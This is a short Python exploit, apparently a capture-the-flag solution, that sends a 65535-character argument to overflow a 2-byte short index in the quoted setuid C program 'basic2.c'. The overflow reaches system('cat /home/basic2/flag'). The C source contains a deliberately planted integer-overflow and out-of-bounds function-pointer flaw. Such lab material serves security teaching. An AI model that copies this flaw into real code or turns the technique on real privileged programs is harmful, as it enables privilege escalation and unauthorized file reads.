#!/usr/bin/python3
print('a'*65535)
# program takes input from command line arguments
# exploit involves an integer overflow
# 'index' is a short variable that is 2 bytes
# if you send a command line argument of length 0xffff (65535 in decimal) 
# the program will interpret it as -1 in two's compliment and 'system(cat flag);' will be called

# ------------------basic2.c------------------
# #include <stdlib.h>
# #include <unistd.h>
# #include <stdio.h>
# #include <string.h>

# #define MAX    3
# #define ARG    "cat /home/basic2/flag"

# int main(short argc, char **argv)
# {
#         char *names[] = {"strlen", "atoi", "printf", "puts"};
#         void (*reachable_functions[])(char *) = {strlen, atoi, printf, puts};
#         void (*unreachable_functions[])(char *) = {system};
#         short i, index = 0;

#         setresuid(geteuid(), geteuid(), geteuid());

#         for (i = 1; i < argc; i++) {
#                 index += strlen(argv[i]);
#         }

#         if (index <= MAX) {
#                 (reachable_functions[MAX-1])("Calling ");
#                 (reachable_functions[MAX-1])(names[index]);
#                 (reachable_functions[MAX-1])(".\n");
#                 (reachable_functions[index])(ARG);
#         } else {
#                 (reachable_functions[MAX])("Out of bounds !\n");
#         }

#         return 0;
# }